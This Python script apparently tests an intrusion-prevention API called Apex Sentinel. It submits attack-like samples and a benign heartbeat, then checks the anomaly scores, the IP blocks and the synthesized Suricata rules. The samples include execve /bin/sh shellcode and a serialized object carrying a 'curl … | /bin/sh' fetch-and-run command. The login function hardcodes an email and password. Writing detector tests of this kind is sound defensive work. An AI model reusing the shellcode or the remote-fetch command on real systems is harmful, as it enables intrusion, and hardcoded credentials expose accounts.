#!/usr/bin/env python3
"""
Apex Sentinel Autonomous AI/ML Zero-Day Threat Interceptor Audit

Validates:
1. Mathematical Detection: Identifies zero-day / novel attacks having ZERO matching keywords
   purely via multi-vector feature extraction (entropy, variance, non-printable ratio, delimiter density).
2. Autonomous IPS Severance: Instantly drops attacker IP into PostgreSQL `blocked_ips` (MTTC < 0.4s).
3. Rule Synthesis: Autonomously synthesizes active Suricata/Snort drop signatures and persists them to `rules` table.
4. False Positive Immunity: Benign operational telemetry is evaluated and permitted without severance.
"""

import json
import time
import sys
import urllib.request
import urllib.parse

API_BASE = "http://localhost:8000"

NOVEL_ZERO_DAY_PAYLOADS = [
    {
        "name": "Zero-Day Vector 1: Polymorphic Raw Shellcode (0 Keywords)",
        "src_ip": "193.142.58.19",
        "dst_ip": "10.0.1.45",
        "dst_port": 445,
        "protocol": "TCP",
        "signature": "Raw Ingress Binary Stream [Opaque Execution Vector]",
        "category": "unlabelled_raw_traffic",
        "severity": "CRITICAL",
        "risk_score": 95,
        "payload": "\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80",
        "expected_min_anomaly": 0.80,
    },
    {
        "name": "Zero-Day Vector 2: Unseen Deserialization Tree (0 Keywords)",
        "src_ip": "45.154.255.88",
        "dst_ip": "10.0.2.14",
        "dst_port": 8080,
        "protocol": "TCP/HTTP",
        "signature": "Custom HTTP Ingress [Anomalous Serialization Tree]",
        "category": "unlabelled_raw_traffic",
        "severity": "HIGH",
        "risk_score": 88,
        "payload": 'O:8:"Exploit":2:{s:4:"cmd";s:28:"/usr/bin/python3 -c import...";s:4:"args";a:3:{i:0;s:2:"-c";i:1;s:18:"curl -sL 193.142";i:2;s:7:"| /bin/sh";};s:5:"chain";a:2:{i:0;O:10:"ClassProxy":1:{s:6:"target";s:12:"KernelRunner";};i:1;b:1;};}',
        "expected_min_anomaly": 0.75,
    },
    {
        "name": "Zero-Day Vector 3: High-Entropy Encrypted Beacon (0 Keywords)",
        "src_ip": "185.220.101.5",
        "dst_ip": "10.0.1.99",
        "dst_port": 8443,
        "protocol": "TCP/TLS",
        "signature": "Opaque Ingress Flow [Statistically Aberrant Distribution]",
        "category": "unlabelled_raw_traffic",
        "severity": "CRITICAL",
        "risk_score": 92,
        "payload": "7e4b9a2f1c8d0e3b5a7c9e1f3a5b7d9f2e4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a",
        "expected_min_anomaly": 0.80,
    }
]

BENIGN_BASELINE_PAYLOAD = {
    "name": "Benign Operational Baseline (Node Heartbeat)",
    "src_ip": "10.0.0.12",
    "dst_ip": "10.0.0.1",
    "dst_port": 443,
    "protocol": "TCP/HTTPS",
    "signature": "Node Heartbeat Ping: cluster-node-alpha status=OK",
    "category": "system_telemetry",
    "severity": "LOW",
    "risk_score": 10,
    "payload": '{"service":"node-agent","status":"healthy","uptime_seconds":86400,"memory_usage_pct":42.1,"disk_free_gb":184}',
}

def get_token():
    login_data = urllib.parse.urlencode({
        "username": "krrish183224@gmail.com",
        "password": "183@Krrish"
    }).encode()
    req = urllib.request.Request(
        f"{API_BASE}/api/auth/login",
        data=login_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode())["access_token"]

def query_blocked_ips(token):
    req = urllib.request.Request(
        f"{API_BASE}/api/ips-actions",
        headers={"Authorization": f"Bearer {token}"}
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode())

def query_rules(token):
    req = urllib.request.Request(
        f"{API_BASE}/api/rules?limit=50",
        headers={"Authorization": f"Bearer {token}"}
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode())

def run_zero_day_audit():
    print("=" * 80)
    print("  APEX SENTINEL: AUTONOMOUS AI/ML ZERO-DAY DETECTION & WIRE-SPEED IPS AUDIT")
    print("  Testing Unknown Attacks with ZERO Hardcoded Keywords or Signatures")
    print("=" * 80)

    token = get_token()
    print("[+] Successfully authenticated to Apex Sentinel Backend API")

    passed = 0
    total = len(NOVEL_ZERO_DAY_PAYLOADS) + 1  # 3 attacks + 1 benign

    # ── Phase 1: Evaluate & Sever Novel Zero-Day Attacks ──────────────
    for idx, atk in enumerate(NOVEL_ZERO_DAY_PAYLOADS, 1):
        print(f"\n--- [Test {idx}/{total}] Ingesting Novel Attack: {atk['name']} ---")
        print(f"    Target IP: {atk['src_ip']} -> :{atk['dst_port']}")
        print(f"    Raw Payload Snippet: {atk['payload'][:45]}...")

        post_data = json.dumps({
            "src_ip": atk["src_ip"],
            "dst_ip": atk["dst_ip"],
            "dst_port": atk["dst_port"],
            "protocol": atk["protocol"],
            "signature": atk["signature"],
            "category": atk["category"],
            "severity": atk["severity"],
            "risk_score": atk["risk_score"],
            "raw_event": {
                "payload": atk["payload"],
                "packet_hex": atk["payload"],
                "data": atk["payload"]
            }
        }).encode()

        req = urllib.request.Request(
            f"{API_BASE}/api/alerts",
            data=post_data,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}"
            }
        )

        t0 = time.time()
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read().decode())
        latency_ms = (time.time() - t0) * 1000

        # Extract telemetry
        ai_eval = data.get("ai_evaluation", {})
        mitigation = data.get("autonomous_mitigation", {})
        ml_vector = ai_eval.get("ml_feature_vector", {})
        synthesized_rule = ai_eval.get("synthesized_rule", {})

        print(f"    [Response in {latency_ms:.1f}ms]")
        print(f"    Mathematical Feature Extraction:")
        print(f"      - Shannon Entropy H(X): {ml_vector.get('shannon_entropy')}")
        print(f"      - Byte Variance:        {ml_vector.get('byte_variance')}")
        print(f"      - Non-Printable Ratio:  {ml_vector.get('non_printable_density')}")
        print(f"      - Delimiter Density:    {ml_vector.get('delimiter_complexity')}")
        print(f"      - Velocity Z-Score:     {ml_vector.get('velocity_zscore')} sigma")
        print(f"    AI Classification:        {ai_eval.get('attack_family')} (Anomaly: {ai_eval.get('anomaly_score')})")
        print(f"    Autonomous IPS Action:    {mitigation.get('action')} (MTTC: {mitigation.get('mttc')})")

        # Assertions
        anomaly_ok = ai_eval.get("anomaly_score", 0) >= atk["expected_min_anomaly"]
        prevented_ok = mitigation.get("prevented") is True and mitigation.get("action") == "FIREWALL_DROP_SEVERED"

        # Check blocked_ips database table
        blocked_data = query_blocked_ips(token)
        blocked_records = blocked_data.get("items", []) if isinstance(blocked_data, dict) else blocked_data
        ip_in_blocklist = any(
            atk["src_ip"] in str(r.get("ip_address", "")) and r.get("is_active") is True
            for r in blocked_records
        )

        # Check synthesized rule
        has_synth_rule = synthesized_rule and "drop ip" in synthesized_rule.get("rule_syntax", "")

        print(f"    Verification Checks:")
        print(f"      [x] Anomaly Score >= {atk['expected_min_anomaly']}: {'PASS' if anomaly_ok else 'FAIL'}")
        print(f"      [x] Autonomous IPS Severance:            {'PASS' if prevented_ok else 'FAIL'}")
        print(f"      [x] Attacker Quarantined in Database:   {'PASS' if ip_in_blocklist else 'FAIL'}")
        print(f"      [x] Suricata Hardware Rule Synthesized: {'PASS' if has_synth_rule else 'FAIL'}")

        if anomaly_ok and prevented_ok and ip_in_blocklist and has_synth_rule:
            print(f"    >>> RESULT: TEST {idx} PASSED (100% Autonomous Containment)")
            passed += 1
        else:
            print(f"    >>> RESULT: TEST {idx} FAILED")

    # ── Phase 2: Verify Benign Operational Baseline (No False Positive) ─
    print(f"\n--- [Test 4/{total}] Ingesting Benign Baseline Telemetry ---")
    post_data = json.dumps({
        "src_ip": BENIGN_BASELINE_PAYLOAD["src_ip"],
        "dst_ip": BENIGN_BASELINE_PAYLOAD["dst_ip"],
        "dst_port": BENIGN_BASELINE_PAYLOAD["dst_port"],
        "protocol": BENIGN_BASELINE_PAYLOAD["protocol"],
        "signature": BENIGN_BASELINE_PAYLOAD["signature"],
        "category": BENIGN_BASELINE_PAYLOAD["category"],
        "severity": BENIGN_BASELINE_PAYLOAD["severity"],
        "risk_score": BENIGN_BASELINE_PAYLOAD["risk_score"],
        "raw_event": {"payload": BENIGN_BASELINE_PAYLOAD["payload"]}
    }).encode()

    req = urllib.request.Request(
        f"{API_BASE}/api/alerts",
        data=post_data,
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}"
        }
    )

    with urllib.request.urlopen(req) as resp:
        data = json.loads(resp.read().decode())

    benign_ai = data.get("ai_evaluation", {})
    benign_mitigation = data.get("autonomous_mitigation", {})

    print(f"    Classification:     {benign_ai.get('attack_family')} (Anomaly: {benign_ai.get('anomaly_score')})")
    print(f"    Autonomous Action:  {benign_mitigation.get('action')}")

    benign_anomaly_ok = benign_ai.get("anomaly_score", 1.0) < 0.40
    benign_not_blocked = benign_mitigation.get("prevented") is False

    print(f"      [x] Anomaly Score Low (< 0.40): {'PASS' if benign_anomaly_ok else 'FAIL'}")
    print(f"      [x] No False Positive Severance: {'PASS' if benign_not_blocked else 'FAIL'}")

    if benign_anomaly_ok and benign_not_blocked:
        print(f"    >>> RESULT: TEST 4 PASSED (Baseline Permitted)")
        passed += 1
    else:
        print(f"    >>> RESULT: TEST 4 FAILED")

    # ── Phase 3: Verify Synthesized Rules in Rules Table ───────────────
    print("\n--- Verifying Database Rules Table for AI-Synthesized Signatures ---")
    rules_resp = query_rules(token)
    rules_items = rules_resp.get("items", [])
    ai_rules = [r for r in rules_items if r.get("rule_type") == "ANOMALY" or "AI" in r.get("name", "")]
    print(f"[+] Total AI-Synthesized Drop Signatures active in Rules Table: {len(ai_rules)}")
    for r in ai_rules[:3]:
        print(f"    - ID: {r.get('id')} | Name: {r.get('name')} | Action: {r.get('action')}")

    print("\n" + "=" * 80)
    print(f"  AUDIT SUMMARY: {passed}/{total} TESTS PASSED ({passed/total*100:.1f}%)")
    print("=" * 80)

    if passed == total:
        print("  STATUS: 100% PASS - AUTONOMOUS AI/ML DEFENSE OPERATIONAL")
        return True
    else:
        print("  STATUS: AUDIT DETECTED FAILURES")
        return False

if __name__ == "__main__":
    success = run_zero_day_audit()
    sys.exit(0 if success else 1)
